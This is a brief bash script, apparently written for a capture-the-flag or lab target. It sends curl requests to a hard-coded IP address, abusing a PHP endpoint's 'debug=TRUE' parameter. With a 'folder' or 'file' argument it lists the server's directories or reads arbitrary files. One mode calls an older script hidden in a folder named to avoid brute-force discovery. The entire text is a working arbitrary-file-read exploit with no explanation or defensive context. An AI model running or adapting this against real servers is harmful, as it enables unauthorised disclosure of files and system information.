#!/bin/bash

if [ "$1" = "dir" ]; then
    curl --silent "http://134.122.94.112/get_files_items.php?debug=TRUE&folder=${2}" | grep "<a href=" | sed 's/        <a href=//'
else
    curl --silent "http://134.122.94.112/php_folder_cant_find_me_by_brute_force/old_get_files_items.php?debug=TRUE&file=${2}"
fi
